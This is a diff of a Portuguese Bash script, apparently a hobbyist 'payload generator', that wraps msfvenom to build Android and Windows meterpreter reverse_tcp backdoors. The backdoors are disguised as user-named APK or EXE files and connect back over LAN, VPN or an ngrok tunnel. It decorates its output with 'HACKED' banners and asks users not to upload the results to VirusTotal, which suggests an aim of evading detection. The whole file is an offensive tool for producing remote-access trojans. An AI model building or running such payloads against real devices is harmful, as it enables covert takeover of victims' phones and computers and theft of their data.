@@ -1,5 +1,5 @@
-#!/bin/bash
-#historico
+
+#!/bin/bash 
 # ------------------------------------------------------------------------
 # ESTA FERRAMENTA ELA PERMITE GERAR UM PAYLOAD AUTOMATIZADO              *
 #                    CREATE BY : killercrown                                   *
@@ -9,122 +9,338 @@ CYAN="\033[01;36m"
 RED="\033[01;31m"
 PRETO="\033[30m"
 CLARO="\033[33m"
+WHITE="\033[01;37m"
+
 
 #   CORES
-echo -e "${RED}"
-figlet  "GERADOR"
 
-echo "*---------------------------------------------------*"
-echo "*[*]SEJA BEM VINDO AO GERADOR DE PAYLOAD[*]         *"
-echo "               [*]create by:paulo(killercrown)[*]      "
-echo "               [*]atualizado:26/02/2018 as 13:42[*]"
-echo "*---------------------------------------------------*"
-date
-echo -e "${CYAN}*******************************************************************************"
-echo -e "${RED}** [1]- REDE INTERNA  **"   "${PRETO} ***ANDROID***                            "
-echo -e "${RED}** [2]- REDE EXTERNA  **"   "${PRETO}  ***ANDROID***                           "
-echo -e "${RED}** [3]- REDE INTERNA ** "   "${PRETO}  ***WINDOWS***                           " 
-echo -e "${CYAN}*******************************************************************************"
-echo "[*]qual opcao deseja executar[*]?"
-read opcao
-echo "---------------------------------------------------"
-echo "---------------------------------------------------"
+
+
+#!/bin/bash
+CLARO="\033[33m"
+
+echo -e "${CLARO}"
+echo "========================================================";
+echo "    PAYLOAD | PAYLOAD | PAYLOAD | PAYLOAD "
+echo "    EMAIL:PAULCOPA.HENRINQUELINDO@GMAIL.COM             "
+echo "               V0.1                                         "
+echo "========================================================";
+echo "____  ____  ____  ____   ____     _____  ____         ";
+echo "|    |     |   | |    | |    \   |    | |   |    ";
+echo "| __ |___  |___| |____| |     \  |    | |___|  ";
+echo "|   ||     |\    |    | |     /  |    | |\      ";
+echo "|___||___  | \   |    | |____/   |____| | \       "
+echo "                                                "
+echo "                                                "
+
+echo "                  _____ ___  "
+echo "                  |   \|                             "
+echo "                  |    |---                          "
+echo "                  |___/|___                           "
+echo " _____   ____              _____   ____  ____                             " 
+echo "|     | |    | \   / |     |    | |    | |   \                        "
+echo "| | __| |____|  \ /  |     |    | |____| |    \                              "
+echo "|  |    |    |   |   |     |    | |    | |    /                           "
+echo "|__|    |    |   |   |____ |____| |    | |___/                                "
+echo "								 "
+echo "							         "
+echo "=========================================================";
+echo "   POR FAVOR NAO TESTAR OS PAYLOADS NO WWW.VIRUSTOTAL.COM "
+echo "		   $(uname -a | cut -d '#' -f 1) "
+echo "=========================================================";
+
+read -rsp $'pressiona [ENTER] para continuar........... \n' -n 1 key
+clear
+echo -e "${CLARO}"
+echo "                                                                          "
+echo "                            ..:::::::::..         "
+echo "                         ..:::aad8888888baa:::..  "
+echo "                     .::::d:?88888888888?::8b::::.        "
+echo "                   .:::d8888:?88888888??a888888b:::.      "
+echo "                 .:::d8888888a8888888aa8888888888b:::.    "
+echo "                ::::dP::::::::88888888888::::::::Yb::::   "
+echo "               ::::dP:::::::::Y888888888P:::::::::Yb::::  "
+echo "              ::::d8:::::::::::Y8888888P:::::::::::8b:::: "
+echo "             .::::88::::::::::::Y88888P::::::::::::88::::.        "
+echo "             :::::Y8baaaaaaaaaa88P:T:Y88aaaaaaaaaad8P:::::        "
+echo "             :::::::Y88888888888P::|::Y88888888888P:::::::        "
+echo "             ::::::::::::::::888:::|:::888::::::::::::::::        "
+echo "              :::::::::::::::8888888888888b:::::::::::::: "
+echo "              :::::::::::::::88888888888888:::::::::::::: "
+echo "               :::::::::::::d88888888888888:::::::::::::  "
+echo "                ::::::::::::88::88::88:::88::::::::::::   "
+echo "                  ::::::::::88::88::88:::88::::::::::     "
+echo "                    ::::::::88::88::P::::88::::::::       "
+echo "                      ::::::88::88:::::::88:::::: "
+echo "                          :::::::::::::::::::     "
+
+lanip=`ip addr | grep 'state UP' -A2 | tail -n1 | awk '{print $2}' | cut -f1 -d'/'`
+
+read -rsp $'pressiona [ENTER] para ver as opcoes \n' -n 1 key
+clear
+
+menu ()
+{
+echo -e "${WHITE}       CRIADOR DE PAYLOAD(ESCOLHA POR NUMERO)                                          "
+echo -e "${RED}   _________________________________________             "
+echo "  |    REDES    |   SISTEMAS  |    VERSION  |                                     "
+echo "  |_____________|_____________|_____________| "
+echo "  |REDE INTERNA | ANDROID     |0.1          |[1]"
+echo "  |REDE EXTERNA | ANDROID     |0.5          |[2]"
+echo "  |REDE INTERNA | WINDOWS     |0.1          |[3]"
+echo "  |REDE INTERNA | LINUX       |0.1          |[4]                          "
+echo "  |  EXIT       |  ()         |0.0          |[5]"
+echo "  -------------------------------------------    "
+echo ""
+echo ""
+echo ""
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read fatrat
+
+
+
+
+
 #CRINADO PAYLOAD ANDROID EM REDE INTERNA 
-if [ "$opcao" -eq "1" ]
+
+
+if [ "$fatrat" -eq "1" ]
 then
 clear
-echo -e "${RED}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "           CRIACAO DO PAYLOAD*AND*          * "
-echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "AGUARDE!"
-sleep 3
+                                echo "        _________                                          "
+                                echo -e "${CLARO}        |o     o |                             "  
+                                echo -e "${CYAN}        |________|         88   88   88         "
+                                echo "        |        |                   88   88   88              " 
+                                echo -e "${RED}       /| HACKED | \        88   88   88               "
+                                echo -e "${CYAN}      / |        |  \      88   88   88      "
+                                echo -e "${PRETO}      \ |        |  /     88   88   88           "
+                                echo -e "${CYAN}        |_      _|         888888888888                  "
+                                echo "          |     |                                             "
+                                echo "          |     |                                          "
+                                echo "          \/    \/  INTERNA                                       "
+                                echo -e "${RED} ____          ____    ___   ____   (-)  ____       "
+                                echo -e "|    | |\   | |    \  |   | |    |   |   |   \  "
+                                echo -e "|____| | \  | |     \ |___| |    |   |   |    \   "
+                                echo -e "|    | |  \ | |     / |\    |    |   |   |    /                        "
+                                echo -e "|    | |   \| |____/  | \   |____|   |   |__/          \n "
+
+
+
+
+read -rsp $'presiona [ENTER] para ver as opcoes \n' -n 1 key
 clear
 
-echo -e "${CYAN}[*]digite o ip interno *ETH0* [*]"
-read interno
+echo "                                           ..........    888888888           "
+echo " 88   88    ..    88            88          ..            88     88         "
+echo " 88  88     ..    88            88          ..            88     88    "
+echo " 88 88      ..    88            88          ..            888888888      "
+echo " 888H       ..    88A           88C         ..........K   888E R        "
+echo " 888        ..    88            88          ..            88 88          "
+echo " 88 88      ..    88            88          ..            88  88      "
+echo " 88  88     ..    88            88          ..            88   88        "
+echo " 88   88    ..    8888888888    888888888   ..........    88    88       "
+echo "                                "
+echo "                       "
+echo "                       "
+echo "                               "
+echo "                              "
+echo -e "                            \n"
+echo -e "seu ip interno:$lanip                \n"
+echo "DIGITE SEU IP INTERNO      "
+echo -e " ┌─["${RED}"CROWN]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+     read interno
 
-echo "[*]Digite a porta aberta[*] \n"
-read porta
+echo -e "[*]Digite a porta aberta[*]\n"
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read porta
 
-echo "[*]Digite o nome do aplicativo[*]"
-read apk
+
+echo -e "[*]Digite o nome do aplicativo[*]\n"
+echo -e " ┌─["${RED}"CROWN]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read apk
+
 WHITE="\033[01;37m"
 CLARO="\033[33m"
 PRETO="\033[30m"
-echo "voce usou isso em " 
-date
-echo -e "${CLARO}CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
-msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno  LPORT=$porta R > $apk.apk
+echo -e "${CLARO}[+]CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS...[+]"
+msfvenom -p android/meterpreter/reverse_tcp LHOST=$interno  LPORT=$porta R > apks/$apk.apk
+clear
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
-sleep 2
-clear
-cat metasploit.txt
-fi
-if [ "$opcao" -eq "2" ]
+echo "DIGITE MENU PARA VOLTAR ou SAIR"
+read meu
+if  [ "$meu" == "MENU" ]
 then
 clear
-echo -e "${RED}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "           CRIACAO DO PAYLOAD[AND]          * "
-echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "AGUARDE!"
-sleep 3
+menu
+elif [ "$meu" == "SAIR" ] 
+then
+echo "SAINDO..."
+sleep 2
+exit
+fi
+#########################################
+
+
+
+elif [ "$fatrat" -eq "2" ]
+then
 clear
+                                echo "        _________            "
+                                echo -e "${CLARO}        |o     o |   " 
+                                echo -e "${CYAN}        |________|   "
+                                echo "        |        |        "
+                                echo -e "${RED}       /| HACKED | \         "
+                                echo -e "${CYAN}      / |        |  \         "
+                                echo -e "${PRETO}      \ |        |  /         "
+                                echo -e "${CYAN}        |_      _|            "
+                                echo "          |     |            "
+                                echo "          |     |             "
+                                echo "          \/    \/               "
+
+
+
+
+echo -e "${RED} ____          ____    ___   ____   (-)  ____                         "
+echo -e "|    | |\   | |    \  |   | |    |   |   |   \                        "
+echo -e "|____| | \  | |     \ |___| |    |   |   |    \                     "
+echo -e "|    | |  \ | |     / |\    |    |   |   |    /                        "
+echo -e "|    | |   \| |____/  | \   |____|   |   |___/          \n "
 echo -e "${RED}[-]WARNING: ESTA OPCAO VAI FUCIONAR COM O SERVICO NGROK[-]"
-echo -e "${CLARO}[+]LIGUE O NGROK USANDO: NGROK TCP 4444(OU OUTRA PORTA)"
-sleep 4
+echo -e "${RED}[+]LIGUE O NGROK USANDO: NGROK TCP 4444(OU OUTRA PORTA)\n  \n \n "
+sleep 3
+read -rsp $'PRECIONE [ENTER] PARA IR AO MENU DE OPCAO \n' -n 1 key
 clear
+echo -e "${RED}                              ________                                       "
+echo "888888888     8888888888     (        )     88   88    88    888      8       "
+echo "88            88      88     (        )     88   88    88    88 8     8       " 
+echo "88            88      88     (        )     88   88    88    88  8    8         "
+echo -e "${RED}88            8888888888     ( HACKED )     88   88    88    88   8   8         "
+echo "88            888            ( o      )     88   88    88    88    8  8            "
+echo "88            88 88          (        )     88   88    88    88     8 8       "
+echo "88            88  88         (        )     88   88    88    88      88           "
+echo "88            88    88       (        )     88   88    88    88       8   "
+echo -e "888888888     88     88      ( ______ )     8888888888888    88       8          \n"
+
+
+
+
 echo -e "${RED}[-]VAI USAR VPN OU NGROK? [-]"
-read resposta
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read resposta
+
 if [ "$resposta" == "VPN" ]
 then
+
 echo -e "${CYAN}informe o ip da vpn"
-read vpn
+echo -e " ┌─["${RED}"CROWN]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read vpn
+
 echo "informe a porta"
-read pporta
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read pporta
+
 echo "informe o nome do aplicativo"
-read appk
+echo -e " ┌─["${RED}"CROWN]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read appk
+echo -e "${CLARO}[+]CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDO...[+]"
+
 msfvenom -p android/meterpreter/reverse_tcp LHOST=$vpn LPORT=$pporta R > $appk.apk
-echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDO..."
-echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+clear
+echo  -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
-echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-\n"
+fi
+echo "digite MENU ou SAIR!"
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+	read res
+if [ $res == "MENU" ] 
+then
+menu
+elif [ $res == "SAIR" ] 
+then
+echo "SAINDO..."
+sleep 0.5
+exit
+fi
 
-else
-echo -e "${CLARO}[+]INFORME A PORTA QUE O NGROK GEROU"
-read port
+#######################################################3
+if [ "$resposta" == "NGROK" ]
+then
+echo -e "${CLARO}[+]INFORME A PORTA QUE O NGROK GEROU[+]"
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read port
+
 echo "digite o nome do apk"
-read $app
-echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
+echo -e " ┌─["${RED}"CROWN]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read app
+
+echo -e "${CLARO}CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
 msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io LPORT=$port R > $app.apk
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
 echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
 fi
-fi
-if [ "$opcao" -eq "3" ]
-then
+####################################################
+#####PAYLOAD EM WINDOWS#####
+elif [ "$fatrat" -eq "3" ];then
 clear
-echo -e "${RED}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo "           CRIACAO DO PAYLOAD*WIN*    * "
-echo "-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
-echo -e "${CYAN}AGUARDE!"
-sleep 3
-clear
-echo "[*]digite seu ip interno[ETH0]"
-read ipp
+echo -e "${CLARO} WINDOWS      ____                                     "
+echo -e " ____________|    |                                        "
+echo -e "|            |____|                                 "
+echo -e "${CLARO}|  o     o   |____|                " 
+echo -e "|            |    |                         " 
+echo -e "|     v      |    |                              "  
+echo -e "${RED}|   HACKED   | O  |                     "
+echo -e "${CYAN}|    ___     |    |                      " 
+echo -e "|____________|    |                                 "
+echo -e " ___|     |__|____|                                      "
+echo -e " \___________/                                            \n"
+
+
+sleep 2
+
+echo -e "${CYAN}[*]digite seu ip interno[ETH0]"
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read ipp
+
 echo "digite a porta aberta"
-read portw
+echo -e " ┌─["${RED}"CROWN]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read portw
+
 echo "digite o nome do executavel"
-read exe
-echo "CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS..."
-msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$portw  -f exe > $exe.exe
+echo -e " ┌─["${RED}"KILLER]──[${RED}~]─["$CYAN"menu]:"
+      echo -ne  " └─────► "
+      read exe
+
+echo -e "${CLARO}[+]CRIANDO PAYLOAD, PODE DEMORAR ALGUNS SEGUNDOS...[+]"
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=$ipp LPORT=$portw  -f exe > /apks$exe.exe
+clear
+echo "   "
 echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
-echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **"
-echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**"
-echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-"
+echo -e "${RED}**    PAYLOAD CRIADO COM SUCESSO      **    "
+echo -e "${RED}**    OBRIGADO POR USAR ESSA FERRAMENTA**    "
+echo -e "${RED}*         **SALVO EM /apks**                       "
+echo -e "${CYAN}-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-="
 fi
+
+}
+menu
+
